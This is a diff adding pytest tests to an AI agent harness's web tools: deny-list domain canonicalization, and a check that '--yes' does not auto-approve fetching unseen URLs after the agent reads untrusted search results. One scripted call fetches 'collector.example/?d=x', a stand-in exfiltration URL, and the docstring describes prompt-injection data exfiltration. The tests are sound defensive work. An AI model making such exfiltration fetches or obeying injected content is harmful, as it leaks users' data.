@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import httpx
+import pytest
 
 from flywhl_harness.events import E
 from flywhl_harness.tools.web import UNTRUSTED
@@ -131,6 +132,14 @@ async def test_site_on_the_deny_list_is_refused(ws):
     assert end["status"] == "denied" and "deny_domains" in end["content"] and net.requests == []
 
 
+@pytest.mark.parametrize("site", ["Mirror.SPAM.example.", "spam.example.", "bad site"])
+async def test_site_is_canonicalized_before_the_deny_check(ws, site):
+    net = web_net()
+    h = make_web_harness(ws, [search_call("x", site=site), "好"], net, web__deny_domains=["spam.example"])
+    end = tool_results((await h.run("x")).events, "web_search")[0]
+    assert end["status"] == "denied" and net.requests == []
+
+
 # ---------------------------------------------------------------------- 读取范围
 def fetches(net: Net) -> list[str]:
     return [b["url"] for b in net.bodies(DS_FETCH)]
@@ -161,6 +170,16 @@ async def test_ask_needs_approval_for_unseen_urls(ws):
     allowed = make_web_harness(ws, [fetch_call("https://unknown.example/a"), "好"], net, on_ask="allow", web__default="fetch")
     assert not tool_results((await allowed.run("x")).events, "web_fetch")[0]["is_error"]
     assert fetches(net) == ["https://unknown.example/a"]
+
+
+async def test_yes_does_not_auto_approve_unseen_urls_after_untrusted_content(ws):
+    """--yes 自动批准所有 ask；读过搜索结果之后，没出现过的网址正是注入外传的通道，不能跟着自动批准。"""
+    net = web_net()
+    script = [search_call(), fetch_call("https://collector.example/?d=x"), fetch_call(HIT), "好"]
+    h = make_web_harness(ws, script, net, on_ask="allow", web__default="fetch")
+    unseen, cited = tool_results((await h.run("x")).events, "web_fetch")
+    assert unseen["status"] == "denied" and "--yes 不自动批准" in unseen["content"]
+    assert not cited["is_error"] and fetches(net) == [HIT]   # 搜索结果里出现过的照常读
 
 
 async def test_fetch_allow_and_public_skip_the_question(ws):
